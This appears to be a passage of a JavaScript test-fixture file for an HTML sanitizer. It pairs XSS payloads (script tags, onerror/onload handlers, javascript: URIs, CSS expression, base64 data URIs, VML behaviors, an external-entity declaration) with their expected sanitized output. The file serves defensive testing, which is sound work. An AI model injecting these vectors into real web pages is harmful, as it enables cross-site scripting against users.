    'expected':
      '<div id="2">&amp;ADz&amp;AGn&amp;AG0&amp;AEf&amp;ACA&amp;AHM&amp;AHI&amp;AGO&amp;AD0&amp;AGn&amp;ACA&amp;AG8Abg&amp;AGUAcgByAG8AcgA9AGEAbABlAHIAdAAoADEAKQ&amp;ACAAPABi//["\'`--&gt;]]&gt;]</div>'
  },
  /**
   * meta 与畸形 script 起始片段；
   * 期望危险标签删掉、残留尖括号转义，检查标记和文字区分。
   */
  {
    'payload':
      '<div id="3"><meta charset="x-imap4-modified-utf7">&<script&S1&TS&1>alert&A7&(1)&R&UA;&&<&A9&11/script&X&>//["\'`-->]]>]</div>',
    'expected':
      '<div id="3">&amp;alert&amp;A7&amp;(1)&amp;R&amp;UA;&amp;&amp;&lt;&amp;A9&amp;11/script&amp;X&amp;&gt;//["\'`--&gt;]]&gt;]</div>'
  },
  /**
   * worker 构造脚本后跟 postMessage 文字；
   * 期望 script 丢弃而尾部文本保留，检查脚本子树禁内容。
   */
  {
    'payload':
      '<div id="4">0?<script>Worker("#").onmessage=function(_)eval(_.data)</script> :postMessage(importScripts(\'data:;base64,cG9zdE1lc3NhZ2UoJ2FsZXJ0KDEpJyk\'))//["\'`-->]]>]</div>',
    'expected':
      '<div id="4">0? :postMessage(importScripts(\'data:;base64,cG9zdE1lc3NhZ2UoJ2FsZXJ0KDEpJyk\'))//["\'`--&gt;]]&gt;]</div>'
  },
  /**
   * script 调用 crypto API；
   * 期望整段脚本消失，检查默认 script 拒绝。
   */
  {
    'payload':
      "<div id=\"5\"><script>crypto.generateCRMFRequest('CN=0',0,0,null,'alert(5)',384,null,'rsa-dual-use')</script>//[\"'`-->]]>]</div>",
    'expected': '<div id="5">//["\'`--&gt;]]&gt;]</div>'
  },
  /**
   * script 安装属性 setter；
   * 期望脚本消失，检查脚本内容不提升为文本。
   */
  {
    'payload':
      '<div id="6"><script>({set/**/$($){_/**/setter=$,_=1}}).$=alert</script>//["\'`-->]]>]</div>',
    'expected': '<div id="6">//["\'`--&gt;]]&gt;]</div>'
  },
  /**
   * input 自动聚焦与 onfocus；
   * 期望 input 无这些属性，检查自动焦点名称与 handler 删除。
   */
  {
    'payload':
      '<div id="7"><input onfocus=alert(7) autofocus>//["\'`-->]]>]</div>',
    'expected': '<div id="7"><input>//["\'`--&gt;]]&gt;]</div>'
  },
  /**
   * 多输入用 blur/focus/autofocus；
   * 期望输入存活、危险属性消失，检查多个节点的属性过滤。
   */
  {
    'payload':
      '<div id="8"><input onblur=alert(8) autofocus><input autofocus>//["\'`-->]]>]</div>',
    'expected': '<div id="8"><input><input>//["\'`--&gt;]]&gt;]</div>'
  },
  /**
   * video poster 使用 javascript，style 含旧 -o-link CSS；
   * 候选删 poster、保留或规范化 CSS，检查 URI 属性；
   * 库未解析 CSS 规则。
   */
  {
    'payload':
      '<div id="9"><a style="-o-link:\'javascript:alert(9)\';-o-link-source:current">X</a>//["\'`-->]]>]</div>\n\n<div id="10"><video poster=javascript:alert(10)//></video>//["\'`-->]]>]</div>',
    'expected': [
      '<div id="9"><a style="-o-link:\'javascript:alert(9)\';-o-link-source:current">X</a>//["\'`--&gt;]]&gt;]</div>\n\n<div id="10"><video></video>//["\'`--&gt;]]&gt;]</div>',
      '<div id="9"><a style=\'-o-link: "javascript:alert(9)"; -o-link-source: current;\'>X</a>//["\'`--&gt;]]&gt;]</div>\n\n<div id="10"><video></video>//["\'`--&gt;]]&gt;]</div>'
    ]
  },
  /**
   * SVG g 带 onload；
   * 期望 SVG 结构留存、事件删除，检查外来元素属性净化。
   */
  {
    'payload':
      '<div id="11"><svg xmlns="http://www.w3.org/2000/svg"><g onload="javascript:alert(11)"></g></svg>//["\'`-->]]>]</div>',
    'expected':
      '<div id="11"><svg xmlns="http://www.w3.org/2000/svg"><g></g></svg>//["\'`--&gt;]]&gt;]</div>'
  },
  /**
   * body onscroll 与自动聚焦 input；
   * 期望清理事件/自动焦点，检查 body 包装解析后的结果。
   */
  {
    'payload':
      '<div id="12"><body onscroll=alert(12)><br><br><br><br><br><br>...<br><br><br><br><input autofocus>//["\'`-->]]>]</div>',
    'expected':
      '<div id="12"><br><br><br><br><br><br>...<br><br><br><br><input>//["\'`--&gt;]]&gt;]</div>'
  },
  /**
   * 大量未知 x/y 标签包住数字；
   * 期望保留 0/1 文字、删除包装，检查普通拒绝标签内容提升。
   */
  {
    'payload':
      '<div id="13"><x repeat="template" repeat-start="999999">0<y repeat="template" repeat-start="999999">1</y></x>//["\'`-->]]>]</div>',
    'expected': '<div id="13">01//["\'`--&gt;]]&gt;]</div>'
  },
  /**
   * input pattern 含复杂正则并带 value；
   * 期望原属性保留，检查字符串准入，不运行或测量表单验证正则。
   */
  {
    'payload':
      '<div id="14"><input pattern=^((a+.)a)+$ value=aaaaaaaaaaaaaaaaaaaaaaaaaaaaaa!>//["\'`-->]]>]</div>',
    'expected':
      '<div id="14"><input pattern="^((a+.)a)+$" value="aaaaaaaaaaaaaaaaaaaaaaaaaaaaaa!">//["\'`--&gt;]]&gt;]</div>'
  },
  /**
   * 历史 SCRIPT 扩展属性与脚本；
   * 期望整段删除，检查 script 禁内容。
   */
  {
    'payload':
      '<div id="15"><script>({0:#0=alert/#0#/#0#(0)})</script>//["\'`-->]]>]</div>',
    'expected': '<div id="15">//["\'`--&gt;]]&gt;]</div>'
  },
  /**
   * 带 behavior/onbegin 的未知 x；
   * 期望危险元素删除，检查历史行为载体拒绝。
   */
  {
    'payload':
      '<div id="16">X<x style=`behavior:url(#default#time2)` onbegin=`alert(16)` >//["\'`-->]]>]</div>',
    'expected': '<div id="16">X//["\'`--&gt;]]&gt;]</div>'
  },
  /**
   * XML stylesheet 指令与未知根；
   * 期望空串，检查 PI/拒绝元素处理，不执行样式转换。
   */
  {
    'payload':
      '<div id="17"><?xml-stylesheet href="javascript:alert(17)"?><root/>//["\'`-->]]>]</div>',
    'expected': '<div id="17">//["\'`--&gt;]]&gt;]</div>'
  },
  /**
   * script 自带 HTML xmlns 属性；
   * 期望脚本子树删除，检查 HTML 解析不会因命名空间字符串放宽 script 权限。
   */
  {
    'payload':
      '<div id="18"><script xmlns="http://www.w3.org/1999/xhtml">alert(1)</script>//["\'`-->]]>]</div>',
    'expected': '<div id="18">//["\'`--&gt;]]&gt;]</div>'
  },
  /**
   * meta 编码与特殊字节形式脚本文字；
   * 期望删 meta、保留惰性文字，检查未重解码输入。
   */
  {
    'payload':
      '<div id="19"><meta charset="x-mac-farsi">\u00BCscript \u00BEalert(19)//\u00BC/script \u00BE//["\'`-->]]>]</div>',
    'expected':
      '<div id="19">\u00BCscript \u00BEalert(19)//\u00BC/script \u00BE//["\'`--&gt;]]&gt;]</div>'
  },
  /**
   * script 安装 ReferenceError getter；
   * 期望脚本消失，检查默认脚本删除。
   */
  {
    'payload':
      '<div id="20"><script>ReferenceError.prototype.__defineGetter__(\'name\', function(){alert(20)}),x</script>//["\'`-->]]>]</div>',
    'expected': '<div id="20">//["\'`--&gt;]]&gt;]</div>'
  },
  /**
   * script 使用 __noSuchMethod__；
   * 期望脚本消失，检查历史脚本路径仍是拒绝标签。
   */
  {
    'payload':
      '<div id="21"><script>Object.__noSuchMethod__ = Function,[{}][0].constructor._(\'alert(21)\')()</script>//["\'`-->]]>]</div>',
    'expected': '<div id="21">//["\'`--&gt;]]&gt;]</div>'
  },
  /**
   * input focus/blur 属性组合；
   * 期望 handler/autofocus 删除，检查多个属性处理。
   */
  {
    'payload':
      '<div id="22"><input onblur=focus() autofocus><input>//["\'`-->]]>]</div>',
    'expected': '<div id="22"><input><input>//["\'`--&gt;]]&gt;]</div>'
  },
  /**
   * form 的 onforminput 与按钮外部 form/onformchange；
   * 候选保留安全表单布局、删除关联和事件，容纳引擎结构差异。
   */
  {
    'payload':
      '<div id="23"><form id=foobar onforminput=alert(23)><input></form><button form=test onformchange=alert(2)>X</button>//["\'`-->]]>]</div>',
    'expected': [
      '<div id="23"><form id="foobar"><input></form><button>X</button>//["\'`--&gt;]]&gt;]</div>',
      '<div id="23"><form id="foobar"><input><button>X</button>//["\'`--&gt;]]&gt;]</form></div>'
    ]
  },
  /**
   * 历史 set 元素把 innerHTML 指向 img 字符串；
   * 期望元素及其属性删除、残余文字转义，检查拒绝声明式载体。
   */
  {
    'payload':
      '<div id="24">1<set/xmlns=`urn:schemas-microsoft-com:time` style=`behAvior:url(#default#time2)` attributename=`innerhtml` to=`<img/src="x"onerror=alert(24)>`>//["\'`-->]]>]</div>',
    'expected': '<div id="24">1`&gt;//["\'`--&gt;]]&gt;]</div>'
  },
  /**
   * script src 与残余 ;1；
   * 期望整段 script 删除、后续文字保留，检查边界解析。
   */
  {
    'payload':
      '<div id="25"><script src="#">{alert(25)}</script>;1//["\'`-->]]>]</div>',
    'expected': '<div id="25">;1//["\'`--&gt;]]&gt;]</div>'
  },
  /**
   * UTF-7 形状的编码 script；
   * 期望仍为普通文字，检查无额外字符集解码。
   */
  {
    'payload':
      '<div id="26">+ADw-html+AD4APA-body+AD4APA-div+AD4-top secret+ADw-/div+AD4APA-/body+AD4APA-/html+AD4-.toXMLString().match(/.*/m),alert(RegExp.input);//["\'`-->]]>]</div>',
    'expected':
      '<div id="26">+ADw-html+AD4APA-body+AD4APA-div+AD4-top secret+ADw-/div+AD4APA-/body+AD4APA-/html+AD4-.toXMLString().match(/.*/m),alert(RegExp.input);//["\'`--&gt;]]&gt;]</div>'
  },
  /**
   * 旧 CSS -o-link 与 animate 标签；
   * 期望 style 原文留存、动画元素删除，检查标签准入而非 CSS 内容解析。
   */
  {
    'payload':
      '<div id="27"><style>p[foo=bar{}*{-o-link:\'javascript:alert(27)\'}{}*{-o-link-source:current}*{background:red}]{background:green};</style>//["\'`-->]]>]</div><div id="28">1<animate/xmlns=urn:schemas-microsoft-com:time style=behavior:url(#default#time2)  attributename=innerhtml values=<img/src="."onerror=alert(28)>>//["\'`-->]]>]</div>',
    'expected':
      '<div id="27"><style>p[foo=bar{}*{-o-link:\'javascript:alert(27)\'}{}*{-o-link-source:current}*{background:red}]{background:green};</style>//["\'`--&gt;]]&gt;]</div><div id="28">1&gt;//["\'`--&gt;]]&gt;]</div>'
  },
  /**
   * link stylesheet 使用 data URI；
   * 期望整个 link 删除，检查默认资源标签拒绝。
   */
  {
    'payload':
      '<div id="29"><link rel=stylesheet href=data:,*%7bx:expression(alert(29))%7d//["\'`-->]]>]</div>',
    'expected': '<div id="29">]]&gt;]</div>'
  },
  /**
   * style 内 @import data URI；
   * 期望 CSS 原文保留，记录允许 style 的边界，未递归净化 CSS URL。
   */
  {
    'payload':
      '<div id="30"><style>@import "data:,*%7bx:expression(alert(30))%7D";</style>//["\'`-->]]>]</div>',
    'expected':
      '<div id="30"><style>@import "data:,*%7bx:expression(alert(30))%7D";</style>//["\'`--&gt;]]&gt;]</div>'
  },
  /**
   * frameset 带 onload 且未闭合；
   * 期望空串，检查默认载体与内容拒绝。
   */
  {
    'payload': '<div id="31"><frameset onload=alert(31)>//["\'`-->]]>]</div>',
    'expected': ''
  },
  /**
   * table background 使用 javascript；
   * 期望表格结构保留、background 删除，检查 URI 属性规则。
   */
  {
    'payload':
      '<div id="32"><table background="javascript:alert(32)"></table>//["\'`-->]]>]</div>',
    'expected': '<div id="32"><table></table>//["\'`--&gt;]]&gt;]</div>'
  },
  /**
   * 嵌套 a 用 CSS 与 onclick/javascript，解析器会拆分链接；
   * 期望保留修复布局和 style、删除事件/危险 URI。
   */
  {
    'payload':
      '<div id="33"><a style="pointer-events:none;position:absolute;"><a style="position:absolute;" onclick="alert(33);">XXX</a></a><a href="javascript:alert(2)">XXX</a>//["\'`-->]]>]</div>',
    'expected':
      '<div id="33"><a style="pointer-events:none;position:absolute;"></a><a style="position:absolute;">XXX</a><a>XXX</a>//["\'`--&gt;]]&gt;]</div>'
  },
  /**
   * VML frame behavior 元素；
   * 期望该载体删除，检查未知命名空间式标签拒绝。
   */
  {
    'payload':
      '<div id="34">1<vmlframe xmlns=urn:schemas-microsoft-com:vml style=behavior:url(#default#vml);position:absolute;width:100%;height:100% src=test.vml#xss></vmlframe>//["\'`-->]]>]</div>',
    'expected': '<div id="34">1//["\'`--&gt;]]&gt;]</div>'
  },
  /**
   * a 内 VML line 与 behavior；
   * 期望保留安全 a、删除未知子标签，检查包装内容处理。
   */
  {
    'payload':
      '<div id="35">1<a href=#><line xmlns=urn:schemas-microsoft-com:vml style=behavior:url(#default#vml);position:absolute href=javascript:alert(35) strokecolor=white strokeweight=1000px from=0 to=1000 /></a>//["\'`-->]]>]</div>',
    'expected': '<div id="35">1<a href="#"></a>//["\'`--&gt;]]&gt;]</div>'
  },
  /**
   * a 的 style 含 CSS behavior，folder 属性为 javascript；
   * 期望 style 原文留存、folder 删除，检查允许 CSS 与未知属性名称的区别。
   */
  {
    'payload':
      '<div id="36"><a style="behavior:url(#default#AnchorClick);" folder="javascript:alert(36)">XXX</a>//["\'`-->]]>]</div>',
    'expected':
      '<div id="36"><a style="behavior:url(#default#AnchorClick);">XXX</a>//["\'`--&gt;]]&gt;]</div>'
  },
  /**
   * 注释关闭后出现真实 img/onerror；
   * 期望图片只留 src，检查新活动节点的属性过滤。
   */
  {
    'payload':
      '<div id="37"><!--<img src="--><img src=x onerror=alert(37)//">//["\'`-->]]>]</div>',
    'expected': '<div id="37"><img src="x">//["\'`--&gt;]]&gt;]</div>'
  },
  /**
   * 历史 comment 包装的关闭标记和 img 形状嵌入 src 值；
   * 候选保留或转义惰性属性文字，检查没有把值内字符当独立 handler。
   */
  {
    'payload':
      '<div id="38"><comment><img src="</comment><img src=x onerror=alert(38)//">//["\'`-->]]>]</div><div id="39"><!-- up to Opera 11.52, FF 3.6.28 -->',
    'expected': [
      '<div id="38"><img src="</comment><img src=x onerror=alert(38)//">//["\'`--&gt;]]&gt;]</div><div id="39"></div>',
      '<div id="38"><img src="&lt;/comment&gt;&lt;img src=x onerror=alert(38)//">//["\'`--&gt;]]&gt;]</div><div id="39"></div>'
    ]
  },
  /**
   * 畸形声明把 img/onerror 形状嵌入 src；
   * 候选为无 src 图片或值内惰性文字（原字符/实体），检查属性边界解析差异。
   */
  {
    'payload': '<![><img src="]><img src=x onerror=alert(39)//">',
    'expected': [
      '<img>',
      '<img src="]><img src=x onerror=alert(39)//">',
      '<img src="]&gt;&lt;img src=x onerror=alert(39)//">'
    ]
  },
  /**
   * SVG CDATA 边界转出 img；
   * 期望真实图片无事件，检查命名空间/CDATA 解析后的属性净化。
   */
  {
    'payload':
      '<!-- IE9+, FF4+, Opera 11.60+, Safari 4.0.4+, GC7+  -->\n<svg><![CDATA[><image xlink:href="]]><img src=x onerror=alert(2)//"></svg>//["\'`-->]]>]</div>',
    'expected':
      '<svg>&gt;&lt;image xlink:href="</svg><img src="x">//["\'`--&gt;]]&gt;]'
  },
  /**
   * style 闭合标签后出现 img；
   * 期望图片无 onerror，检查 HTML raw-text 结束边界。
   */
  {
    'payload':
      '<div id="40"><style><img src="</style><img src=x onerror=alert(40)//">//["\'`-->]]>]</div>',
    'expected': '<div id="40"><img src="x">//["\'`--&gt;]]&gt;]</div>'
  },
  /**
   * li 的 list-style CSS URL 与 onerror；
   * 期望 style 保留、事件删除，检查允许 CSS 字符串与 handler 名称。
   */
  {
    'payload':
      '<div id="41"><li style=list-style:url() onerror=alert(41)></li>',
    'expected': '<div id="41"><li style="list-style:url()"></li></div>'
  },
  /**
   * style 的 content data URI 与 onload；
   * 期望 CSS 留存、onload 删除，检查属性名称而非 CSS URI 内部内容。
   */
  {
    'payload':
      '<div style=content:url(data:image/svg+xml,%3Csvg/%3E);visibility:hidden onload=alert(41)></div>//["\'`-->]]>]</div>',
    'expected':
      '<div style="content:url(data:image/svg+xml,%3Csvg/%3E);visibility:hidden"></div>//["\'`--&gt;]]&gt;]'
  },
  /**
   * base 使用 javascript，后续 href 相对；
   * 期望 base 删除、相对链接保留，检查基地址标签拒绝。
   */
  {
    'payload':
      '<div id="42"><head><base href="javascript://"/></head><body><a href="/. /,alert(42)//#">XXX</a></body>//["\'`-->]]>]</div>',
    'expected':
      '<div id="42"><a href="/. /,alert(42)//#">XXX</a>//["\'`--&gt;]]&gt;]</div>'
  },
  /**
   * XML processing instruction；
   * 期望指令不进入结果，检查 PI 节点删除。
   */
  {
    'payload': '<div id="43"><?xml version="1.0" standalone="no"?>',
    'expected': '<div id="43"></div>'
  },
  /**
   * 完整文档的 style 在 head、Hello 在 body；
   * 期望返回 body 文字与尾部转义杂字、不返回 head 样式，检查默认返回范围。
   */
  {
    'payload':
      '<html xmlns="http://www.w3.org/1999/xhtml">\n<head>\n<style type="text/css">\n@font-face {font-family: y; src: url("font.svg#x") format("svg");} body {font: 100px "y";}\n</style>\n</head>\n<body>Hello</body>\n</html>//["\'`-->]]>]</div>',
    'expected': 'Hello\n//["\'`--&gt;]]&gt;]'
  },
  /**
   * 畸形 @import 选择器与括号；
   * 期望 style 原文保留，记录 DOM 净化不解释 CSS 语法。
   */
  {
    'payload':
      '<div id="44"><style>*[{}@import\'test.css?]{color: green;}</style>X//["\'`-->]]>]</div>',
    'expected':
      '<div id="44"><style>*[{}@import\'test.css?]{color: green;}</style>X//["\'`--&gt;]]&gt;]</div>'
  },
  /**
   * font-family 值内有方括号、分号与颜色字样；
   * 期望 style 原文保留，检查样式属性的字符串准入。
   */
  {
    'payload':
      '<div id="45"><div style="font-family:\'foo[a];color:red;\';">XXX</div>//["\'`-->]]>]</div>',
    'expected':
      '<div id="45"><div style="font-family:\'foo[a];color:red;\';">XXX</div>//["\'`--&gt;]]&gt;]</div>'
  },
  /**
   * font-family 中有闭合花括号与 color=red；
   * 期望 style 原文保留，检查 CSS 字符串返回。
   */
  {
    'payload':
      '<div id="46"><div style="font-family:foo}color=red;">XXX</div>//["\'`-->]]>]</div>',
    'expected':
      '<div id="46"><div style="font-family:foo}color=red;">XXX</div>//["\'`--&gt;]]&gt;]</div>'
  },
  /**
   * SVG 中 script；
   * 期望 SVG 保留、脚本子树消失，检查外来内容中的脚本拒绝。
   */
  {
    'payload':
      '<div id="47"><svg xmlns="http://www.w3.org/2000/svg"><script>alert(47)</script></svg>//["\'`-->]]>]</div>',
    'expected':
      '<div id="47"><svg xmlns="http://www.w3.org/2000/svg"></svg>//["\'`--&gt;]]&gt;]</div>'
  },
  /**
   * 带 FOR/EVENT 的旧 SCRIPT；
   * 期望脚本删除，检查历史事件脚本载体。
   */
  {
    'payload':
      '<div id="48"><SCRIPT FOR=document EVENT=onreadystatechange>alert(48)</SCRIPT>//["\'`-->]]>]</div>',
    'expected': '<div id="48">//["\'`--&gt;]]&gt;]</div>'
  },
  /**
   * ActiveX object/param 组合；
   * 期望整棵对象删除，检查默认插件载体拒绝。
   */
  {
    'payload':
      '<div id="49"><OBJECT CLASSID="clsid:333C7BC4-460F-11D0-BC04-0080C7055A83"><PARAM NAME="DataURL" VALUE="javascript:alert(49)"></OBJECT>//["\'`-->]]>]</div>',
    'expected': '<div id="49">//["\'`--&gt;]]&gt;]</div>'
  },
  /**
   * object data 为编码 HTML；
   * 期望对象删除，检查载体拒绝，不解码 data 内容。
   */
  {
    'payload':
      '<div id="50"><object data="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg=="></object>//["\'`-->]]>]</div>',
    'expected': '<div id="50">//["\'`--&gt;]]&gt;]</div>'
  },
  /**
   * embed src 为编码 HTML；
   * 期望 embed 删除，检查插件载体拒绝。
   */
  {
    'payload':
      '<div id="51"><embed src="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg=="></embed>//["\'`-->]]>]</div>',
    'expected': '<div id="51">//["\'`--&gt;]]&gt;]</div>'
  },
  /**
   * 未知 x 的 behavior 与 XML src 标签；
   * 期望元素删除，检查不允许的历史载体。
   */
  {
    'payload':
      '<div id="52"><x style="behavior:url(test.sct)">//["\'`-->]]>]</div><div id="53"><xml id="xss" src="test.htc"></xml>',
    'expected': '<div id="52">//["\'`--&gt;]]&gt;]</div><div id="53"></div>'
  },
  /**
   * label 的 datasrc/datafld/dataformatas；
   * 期望标签留存而绑定属性删除，检查这些名称不等同普通 data-*。
   */
  {
    'payload':
      '<label dataformatas="html" datasrc="#xss" datafld="payload"></label>//["\'`-->]]>]</div>',
    'expected': '<label></label>//["\'`--&gt;]]&gt;]'
  },
  /**
   * script 调用 __defineSetter__；
   * 期望脚本删除，检查脚本禁内容。
   */
  {
    'payload':
      "<div id=\"54\"><script>[{'a':Object.prototype.__defineSetter__('b',function(){alert(arguments[0])}),'b':['secret']}]</script>//[\"'`-->]]>]</div>",
    'expected': '<div id="54">//["\'`--&gt;]]&gt;]</div>'
  },
  /**
   * video/source 中 source onerror，没有 src；
   * 期望媒体结构留存、事件删除，检查子元素属性。
   */
  {
    'payload':
      '<div id="55"><video><source onerror="alert(55)">//["\'`-->]]>]</div>',
    'expected': '<div id="55"><video><source>//["\'`--&gt;]]&gt;]</video></div>'
  },
  /**
   * video 本身 onerror；
   * 期望视频留存、事件删除，检查容器属性。
   */
  {
    'payload':
      '<div id="56"><video onerror="alert(56)"><source></source></video>//["\'`-->]]>]</div>',
    'expected': '<div id="56"><video><source></video>//["\'`--&gt;]]&gt;]</div>'
  },
  /**
   * 畸形 b 属性名含 script 起始形状；
   * 期望属性删除、残余脚本字样为文本，检查解析出的名称过滤。
   */
  {
    'payload':
      '<div id="57"><b <script>alert(57)//</script>0</script></b>//["\'`-->]]>]</div>',
    'expected': '<div id="57"><b>alert(57)//0</b>//["\'`--&gt;]]&gt;]</div>'
  },
  /**
   * 畸形 script 名称嵌在 b；
   * 期望空 b，检查解析器修复后的拒绝节点。
   */
  {
    'payload':
      '<div id="58"><b><script<b></b><alert(58)</script </b></b>//["\'`-->]]>]</div>',
    'expected': '<div id="58"><b></b>//["\'`--&gt;]]&gt;]</div>'
  },
  /**
   * input value 含反引号及 onmouseover 文字，后跟真实 script；
   * 期望 value 惰性文字留存、脚本删除，区分值与事件属性。
   */
  {
    'payload':
      '<div id="59"><div id="div1"><input value="``onmouseover=alert(59)"></div> <div id="div2"></div><script>document.getElementById("div2").innerHTML = document.getElementById("div1").innerHTML;</script>//["\'`-->]]>]</div>',
    'expected':
      '<div id="59"><div id="div1"><input value="``onmouseover=alert(59)"></div> <div id="div2"></div>//["\'`--&gt;]]&gt;]</div>'
  },
  /**
   * 未知 CSS 属性名含特殊字节；
   * 期望 style 原文保留，检查 DOM 属性准入边界。
   */
  {
    'payload':
      '<div id="60"><div style="[a]color[b]:[c]red">XXX</div>//["\'`-->]]>]</div>',
    'expected':
      '<div id="60"><div style="[a]color[b]:[c]red">XXX</div>//["\'`--&gt;]]&gt;]</div>'
  },
  /**
   * 引号与声明边界制造未知标签和事件；
   * 期望危险元素/属性删去、尾部文字转义，检查畸形标记处理。
   */
  {
    'payload':
      "<div id=\"62\"><!-- IE 6-8 -->\n<x '=\"foo\"><x foo='><img src=x onerror=alert(62)//'>\n<!-- IE 6-9 -->\n<! '=\"foo\"><x foo='><img src=x onerror=alert(2)//'>\n<? '=\"foo\"><x foo='><img src=x onerror=alert(3)//'>//[\"'`-->]]>]</div>",
    'expected': '<div id="62">\n\n\n\n//["\'`--&gt;]]&gt;]</div>'
  },
  /**
   * embed/script 与 image 标签的 javascript src；
   * 期望载体删除、image 按解析结果成为安全 img，检查标签修复与 URI 过滤。
   */
  {
    'payload':
      '<div id="63"><embed src="javascript:alert(63)"></embed> // O10.10\u2193, OM10.0\u2193, GC6\u2193, FF\n<img src="javascript:alert(2)">\n<image src="javascript:alert(2)"> // IE6, O10.10\u2193, OM10.0\u2193\n<script src="javascript:alert(3)"></script> // IE6, O11.01\u2193, OM10.1\u2193//["\'`-->]]>]</div>',
    'expected':
      '<div id="63"> // O10.10\u2193, OM10.0\u2193, GC6\u2193, FF\n<img>\n<img> // IE6, O10.10\u2193, OM10.0\u2193\n // IE6, O11.01\u2193, OM10.1\u2193//["\'`--&gt;]]&gt;]</div>'
  },
  /**
   * HTML doctype 声明外部实体并引用 &x;；
   * 期望声明删除、引用按文字转义，检查 HTML 解析不解析外部 XML 实体。
   */
  {
    'payload':
      '<div id="64"><!DOCTYPE x[<!ENTITY x SYSTEM "http://html5sec.org/test.xxe">]><y>&x;</y>//["\'`-->]]>]</div>',
    'expected': '<div id="64">]&gt;&amp;x;//["\'`--&gt;]]&gt;]</div>'
  },
  /**
   * SVG onload 和 XML 指令；
   * 期望 SVG 无事件且无 PI，检查元素属性与指令处理。
   */
  {
    'payload':
      '<div id="65"><svg onload="javascript:alert(65)" xmlns="http://www.w3.org/2000/svg"></svg>//["\'`-->]]>]</div><div id="66"><?xml version="1.0"?>',
    'expected':
      '<div id="65"><svg xmlns="http://www.w3.org/2000/svg"></svg>//["\'`--&gt;]]&gt;]</div><div id="66"></div>'
  },
  /**
   * data XSL 指令/doctype 后接 img；
   * 期望指令删去、图片安全、声明残片为文本，检查 HTML 解析边界。
   */
  {
    'payload':
      '<?xml-stylesheet type="text/xsl" href="data:,%3Cxsl:transform version=\'1.0\' xmlns:xsl=\'http://www.w3.org/1999/XSL/Transform\' id=\'xss\'%3E%3Cxsl:output method=\'html\'/%3E%3Cxsl:template match=\'/\'%3E%3Cscript%3Ealert(66)%3C/script%3E%3C/xsl:template%3E%3C/xsl:transform%3E"?>\n<root/>//["\'`-->]]>]</div>\n<div id="67"><!DOCTYPE x [\n    <!ATTLIST img xmlns CDATA "http://www.w3.org/1999/xhtml" src CDATA "xx"\n onerror CDATA "alert(67)"\n onload CDATA "alert(2)">\n]><img />//["\'`-->]]>]</div>',
    'expected':
      '//["\'`--&gt;]]&gt;]\n<div id="67">\n]&gt;<img>//["\'`--&gt;]]&gt;]</div>'
  },
  /**
   * 前缀文档/style/x 元素包含 XXX；
   * 期望未知包装删去、普通文本提升，检查默认 HTML 名称准入。
   */
  {
    'payload':
      '<div id="68"><doc xmlns:xlink="http://www.w3.org/1999/xlink" xmlns:html="http://www.w3.org/1999/xhtml">\n    <html:style /><x xlink:href="javascript:alert(68)" xlink:type="simple">XXX</x>\n</doc>//["\'`-->]]>]</div>',
    'expected': '<div id="68">\n    XXX\n//["\'`--&gt;]]&gt;]</div>'
  },
  /**
   * WML card/onevent/go/timer 载体；
   * 期望危险结构删除，检查未知元素与默认禁内容。
   */
  {
    'payload':
      '<div id="69"><card xmlns="http://www.wapforum.org/2001/wml"><onevent type="ontimer"><go href="javascript:alert(69)"/></onevent><timer value="1"/></card>//["\'`-->]]>]</div>',
    'expected': '<div id="69">//["\'`--&gt;]]&gt;]</div>'
  },
  /**
   * style 的旧 filter 与 onfilterchange；
   * 期望 CSS 留存、handler 删除，检查属性名称分工。
   */
  {
    'payload':
      '<div id="70"><div style=width:1px;filter:glow onfilterchange=alert(70)>x</div>//["\'`-->]]>]</div>',
    'expected':
      '<div id="70"><div style="width:1px;filter:glow">x</div>//["\'`--&gt;]]&gt;]</div>'
  },
  /**
   * 畸形结束标签夹 CSS expression；
   * 期望危险标记消失，检查解析修复后的拒绝结构。
   */
  {
    'payload':
      '<div id="71"><// style=x:expression\u00028alert(71)\u00029>//["\'`-->]]>]</div>',
    'expected': '<div id="71">//["\'`--&gt;]]&gt;]</div>'
  },
  /**
   * form/button 的 javascript formaction；
   * 期望表单/按钮存活、危险 URI 删除，检查提交 URI 属性。
   */
  {
    'payload':
      '<div id="72"><form><button formaction="javascript:alert(72)">X</button>//["\'`-->]]>]</div>',
    'expected':
      '<div id="72"><form><button>X</button>//["\'`--&gt;]]&gt;]</form></div>'
  },
  /**
   * event-source 的 src/onload；
   * 期望元素删除，检查默认拒绝载体。
   */
  {
    'payload':
      '<div id="73"><event-source src="event.php" onload="alert(73)">//["\'`-->]]>]</div>',
    'expected': '<div id="73">//["\'`--&gt;]]&gt;]</div>'
  },
  /**
   * event-source 放在 javascript 链接内；
   * 期望 a 无 href、子载体删除，检查两层过滤。
   */
  {
    'payload':
      '<div id="74"><a href="javascript:alert(74)"><event-source src="data:application/x-dom-event-stream,Event:click%0Adata:XXX%0A%0A" /></a>//["\'`-->]]>]</div>',
    'expected': '<div id="74"><a></a>//["\'`--&gt;]]&gt;]</div>'
  },
  /**
   * 畸形 script 起始标签；
   * 期望脚本结构删除，检查容错解析后的拒绝。
   */
  {
    'payload':
      '<div id="75"><script<{alert(75)}/></script </>//["\'`-->]]>]</div>',
    'expected': '<div id="75">//["\'`--&gt;]]&gt;]</div>'
  },
  /**
   * 外部 doctype/stylesheet PI 与 &x;；
   * 期望指令声明删除、引用仍是转义文字，检查 HTML 实体边界。
   */
  {
    'payload':
      '<div id="76"><?xml-stylesheet type="text/css"?><!DOCTYPE x SYSTEM "test.dtd"><x>&x;</x>//["\'`-->]]>]</div>',
    'expected': '<div id="76">&amp;x;//["\'`--&gt;]]&gt;]</div>'
  },
  /**
   * PI 与未知根上的 CSS expression；
   * 期望拒绝结构消失，检查指令/标签路径，不解析 CSS 表达式。
   */
  {
    'payload':
      '<div id="77"><?xml-stylesheet type="text/css"?><root style="x:expression(alert(77))"/>//["\'`-->]]>]</div>',
    'expected': '<div id="77">//["\'`--&gt;]]&gt;]</div>'
  },
  /**
   * PI 后 img 声明 xmlns；
   * 期望 PI 删除、xmlns 字符串可保留，检查 HTML 模式不因该属性改变元素真实命名空间。
   */
  {
    'payload':
      '<div id="78"><?xml-stylesheet type="text/xsl" href="#"?><img xmlns="x-schema:test.xdr"/>//["\'`-->]]>]</div>',
    'expected':
      '<div id="78"><img xmlns="x-schema:test.xdr">//["\'`--&gt;]]&gt;]</div>'
  },
  /**
   * object allowscriptaccess 载体；
   * 期望整段对象删除，检查插件标签拒绝。
   */
  {
    'payload':
